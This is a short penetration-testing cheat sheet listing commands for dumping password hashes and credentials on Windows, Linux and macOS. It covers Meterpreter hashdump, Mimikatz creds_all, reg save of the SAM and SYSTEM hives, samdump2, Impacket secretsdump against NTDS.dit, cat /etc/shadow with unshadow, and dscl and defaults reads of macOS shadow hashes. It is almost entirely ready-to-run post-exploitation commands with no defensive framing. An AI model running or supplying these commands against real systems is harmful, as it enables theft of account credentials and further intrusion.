# Windows: 

## Meterpreter HashDump

- run post/windows/gather/hashdump

## Meterpreter Mimikatz (Post Exploitation must be executed from SYSTEM privileges)

- load mimikatz
- creds_all

DUMP LSA SECRETS
- lsadump.py sys_backup.hiv sec_backup.hiv

DUMP LOCAL PASSWORD HASHES

- pwdump.py sys_backup.hiv sec_backup.hiv

## reg.exe 

- reg save HKLM\sam sam
- reg save HKLM\system system

## samdump2

- samdump2 SYSTEM SAM > hashes.db

## Impacket Tools: 

- secretsdump.py -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-hashes

If you have the NTDS.dit file and the SYSTEM hive: 

- secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Linux

Requires Root Privileges

- cat /etc/shadow

- cp /etc/passwd and shadow
- unshadow passwd shadow 

#  OSX

10.5-10.7

- dscl localhost -read /Search/Users/<username>|grep GeneratedUID|cut -c15-cat
/var/db/shadow/hash/<GUID> | cut -c169-216 > osx_hash.txt

10.8-10.12

- sudo defaults read /var/db/dslocal/nodes/Default/users/<username>.plist ShadowHashData|tr -dc ‘
0-9a-f’|xxd -p -r|plutil -convert xml1 - -o -

# Other Resources: 

- Lsassy: https://github.com/Hackndo/lsassy